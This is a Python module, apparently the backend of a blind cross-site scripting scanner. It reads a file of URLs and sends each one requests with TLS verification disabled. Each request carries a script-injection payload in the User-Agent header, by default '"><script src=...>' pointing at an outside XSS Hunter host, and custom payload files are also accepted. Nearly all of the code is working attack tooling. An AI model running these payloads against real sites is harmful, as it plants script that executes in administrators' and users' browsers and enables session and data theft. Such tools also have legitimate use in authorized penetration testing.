from colorama import init
from termcolor import colored
import requests
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
import json
import sys

import requests , optparse , concurrent.futures , urllib3

from os import path

channel_layer = get_channel_layer()
output_lines = []

def clear_data():
    output_lines.clear()

def send(data):
    # message_data = json.dumps(data)
    # message_text = message_data.encode("utf-8")
    async_to_sync(channel_layer.group_send)(
            "output",  # Replace with a unique group name
            {
                "type": "send_output",
                "text": json.dumps(data)
            }
        )

def logOutput(url, code, payload):
    if str(code).startswith("20"):
        # color = "green"
        output_lines.append({'from':'scanner','error':False,'response':200,'link':url,'payload':payload})
        send(output_lines)
    elif str(code).startswith("30"):
        output_lines.append({'from':'scanner','error':False,'response':304,'link':url,'payload':payload})
        send(output_lines)
    # elif str(code).startswith("40") or code.startswith("50"):
    #     color = "red"
    # else:
    #     color = "yellow"

    # init()
    # print(f"[{code}]: {url}\t||\t{payload}", color, attrs=['bold'])
    # # sys.stdout.write(f"{messageColored}\n")

def errorOutput(rule, message):
    pass
    # sys.stdout.write(f"{messageColored}\n")




def PayloadsStripper(Payload):
    payloads=[]
    payload = open(Payload , 'r')
    for pay in payload:
        p = pay.rstrip("\n")
        if 'XXX' not in p:
            output_lines.append({'from':'scanner','error':True,"error_content":"Missing replace string, Your payload doesnt contain the replace string `XXX`"})
            send(output_lines)
            raise
        else:
            payloads.append(p)
    return payloads



def Sender(URL , Redirect , payload , Hunter , Header , Replace):
    payload = payload.replace(Replace , Hunter)

    try:
        http_response = requests.get(URL , verify=False , timeout=5 , headers={Header:payload} , allow_redirects=False)
        logOutput(url=URL, code=http_response.status_code, payload=payload)
    except Exception as e:
        errorOutput("Can't request this URL", URL)


def check(scan_name,url_path,custom_payload):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    Config = {
        "file":url_path,
        "xsshunter":"hacker.xss.ht",
        "bin":"",
        "mode":"",
        "payload":custom_payload,
        "redirection":"allow",
        "header":"User-Agent",
        "replace":"XXX"
    }
   

    Hunter = "https://" + Config["xsshunter"] + "/"
    if custom_payload != None:
        
        Payloads = PayloadsStripper(custom_payload)
    else:
        Payloads= [f'"><script src={Config["replace"]}></script>']
        

    URLs = open(Config["file"] , 'r')
    for URL in URLs:
        URL = URL.rstrip("\n")

 
        for SinglePayload in Payloads:
            Sender(URL=URL , Redirect=Config["redirection"] , payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
        
    return output_lines
